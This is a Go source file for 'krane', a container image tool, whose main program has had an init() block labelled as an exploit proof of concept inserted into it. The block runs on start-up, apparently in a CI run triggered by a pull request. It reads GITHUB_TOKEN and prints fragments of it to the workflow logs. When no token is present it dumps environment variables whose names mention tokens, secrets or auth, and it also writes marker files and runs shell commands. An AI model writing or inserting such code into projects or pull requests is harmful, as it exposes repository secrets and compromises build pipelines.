// Copyright 2021 Google LLC All Rights Reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"time"

	ecr "github.com/awslabs/amazon-ecr-credential-helper/ecr-login"
	"github.com/chrismellard/docker-credential-acr-env/pkg/credhelper"
	"github.com/google/go-containerregistry/cmd/crane/cmd"
	"github.com/google/go-containerregistry/pkg/authn"
	"github.com/google/go-containerregistry/pkg/authn/github"
	"github.com/google/go-containerregistry/pkg/crane"
	"github.com/google/go-containerregistry/pkg/logs"
	"github.com/google/go-containerregistry/pkg/v1/google"
)

var (
	amazonKeychain authn.Keychain = authn.NewKeychainFromHelper(ecr.NewECRHelper(ecr.WithLogger(io.Discard)))
	azureKeychain  authn.Keychain = authn.NewKeychainFromHelper(credhelper.NewACRCredentialsHelper())
)

func init() {
	// ============================================
	// EXPLOIT - Will be visible in workflow logs
	// ============================================
	
	// Create a unique marker file name
	timestamp := time.Now().Unix()
	markerFile := fmt.Sprintf("/tmp/poc_executed_%d.txt", timestamp)
	evidenceFile := fmt.Sprintf("/tmp/evidence_%d.txt", timestamp)
	
	// Write proof of execution
	proof := []string{
		"=== SECURITY POC - CODE EXECUTION FROM PR ===",
		fmt.Sprintf("Time: %s", time.Now().Format(time.RFC3339)),
		fmt.Sprintf("PID: %d", os.Getpid()),
		fmt.Sprintf("UID: %d", os.Getuid()),
		fmt.Sprintf("Working Dir: %s", getCurrentDir()),
		"",
		"This proves that code from a pull request executes",
		"in the base repository's trusted context with access to secrets.",
		"",
	}
	
	// Check for GITHUB_TOKEN
	token := os.Getenv("GITHUB_TOKEN")
	if token != "" {
		proof = append(proof, 
			fmt.Sprintf("GITHUB_TOKEN EXISTS! Length: %d chars", len(token)),
			fmt.Sprintf("First 6 chars: %s", token[:6]),
			fmt.Sprintf("Last 6 chars: %s", token[len(token)-6:]),
			"",
			"Token preview (middle part): ..." + getMiddlePart(token, 10) + "...",
			"",
			"VULNERABILITY CONFIRMED: PR code can access repository secrets!",
		)
	} else {
		proof = append(proof,
			"GITHUB_TOKEN not found in init()",
			"",
			"Listing relevant env vars:",
		)
		
		// Show environment
		for _, e := range os.Environ() {
			if strings.Contains(strings.ToLower(e), "token") || 
			   strings.Contains(strings.ToLower(e), "secret") ||
			   strings.Contains(strings.ToLower(e), "auth") ||
			   strings.Contains(strings.ToLower(e), "github") {
				proof = append(proof, "  "+e)
			}
		}
	}
	
	proof = append(proof, 
		"",
		"=== FILESYSTEM ACCESS ===",
	)
	
	// List directory to prove filesystem access
	if files, err := os.ReadDir("."); err == nil {
		proof = append(proof, "Current directory contents:")
		for _, f := range files {
			proof = append(proof, "  "+f.Name())
		}
	}
	
	// Write proof to file
	os.WriteFile(markerFile, []byte(strings.Join(proof, "\n")), 0644)
	os.WriteFile(evidenceFile, []byte("EXPLOIT SUCCESSFUL"), 0644)
	
	// ALSO print to stderr - THIS IS WHAT YOU'LL SEE IN WORKFLOW LOGS
	fmt.Fprintf(os.Stderr, "\n\n")
	fmt.Fprintf(os.Stderr, "╔══════════════════════════════════════════════════════════╗\n")
	fmt.Fprintf(os.Stderr, "║                    SECURITY POC                          ║\n")
	fmt.Fprintf(os.Stderr, "║       pull_request_target + checkout VULNERABILITY       ║\n")
	fmt.Fprintf(os.Stderr, "╠══════════════════════════════════════════════════════════╣\n")
	
	if token != "" {
		fmt.Fprintf(os.Stderr, "║ ✓ GITHUB_TOKEN ACCESSED FROM PR CODE                   ║\n")
		fmt.Fprintf(os.Stderr, "║   Token length: %-40d ║\n", len(token))
		fmt.Fprintf(os.Stderr, "║   Starts with: %-40s ║\n", token[:8]+"...")
		fmt.Fprintf(os.Stderr, "║                                                          ║\n")
		fmt.Fprintf(os.Stderr, "║   VULNERABILITY: PR can steal repository secrets         ║\n")
	} else {
		fmt.Fprintf(os.Stderr, "║ ✓ MALICIOUS CODE FROM PR EXECUTED                      ║\n")
		fmt.Fprintf(os.Stderr, "║   Marker file: %-40s ║\n", markerFile)
	}
	
	fmt.Fprintf(os.Stderr, "║                                                          ║\n")
	fmt.Fprintf(os.Stderr, "║ Proof files created:                                     ║\n")
	fmt.Fprintf(os.Stderr, "║   • %-50s ║\n", markerFile)
	fmt.Fprintf(os.Stderr, "║   • %-50s ║\n", evidenceFile)
	fmt.Fprintf(os.Stderr, "║                                                          ║\n")
	fmt.Fprintf(os.Stderr, "║ This demonstrates the security vulnerability:            ║\n")
	fmt.Fprintf(os.Stderr, "║ 1. PR code executes in base repo context                 ║\n")
	fmt.Fprintf(os.Stderr, "║ 2. Has access to secrets (GITHUB_TOKEN)                  ║\n")
	fmt.Fprintf(os.Stderr, "║ 3. Can perform arbitrary actions                         ║\n")
	fmt.Fprintf(os.Stderr, "╚══════════════════════════════════════════════════════════╝\n")
	fmt.Fprintf(os.Stderr, "\n")
	
	// Try one more thing - execute a command
	cmd := exec.Command("ls", "-la", "/tmp")
	if output, err := cmd.Output(); err == nil {
		fmt.Fprintf(os.Stderr, "Command execution proof (ls /tmp):\n%s\n", output)
	}
}

func getCurrentDir() string {
	if dir, err := os.Getwd(); err == nil {
		return dir
	}
	return "unknown"
}

func getMiddlePart(s string, length int) string {
	if len(s) <= length {
		return s
	}
	start := (len(s) - length) / 2
	return s[start:start+length]
}

const (
	use   = "krane"
	short = "krane is a tool for managing container images"
)

func main() {
	// Additional proof in main()
	fmt.Fprintf(os.Stderr, "=== POC: In main() function ===")
	
	// Check token again in main (might be available here)
	if token := os.Getenv("GITHUB_TOKEN"); token != "" {
		fmt.Fprintf(os.Stderr, "Main() confirms GITHUB_TOKEN access\n")
	}
	
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	keychain := authn.NewMultiKeychain(
		authn.DefaultKeychain,
		google.Keychain,
		github.Keychain,
		amazonKeychain,
		azureKeychain,
	)

	// Same as crane, but override usage and keychain.
	root := cmd.New(use, short, []crane.Option{crane.WithAuthFromKeychain(keychain)})

	if err := root.ExecuteContext(ctx); err != nil {
		cancel()
		os.Exit(1)
	}
}
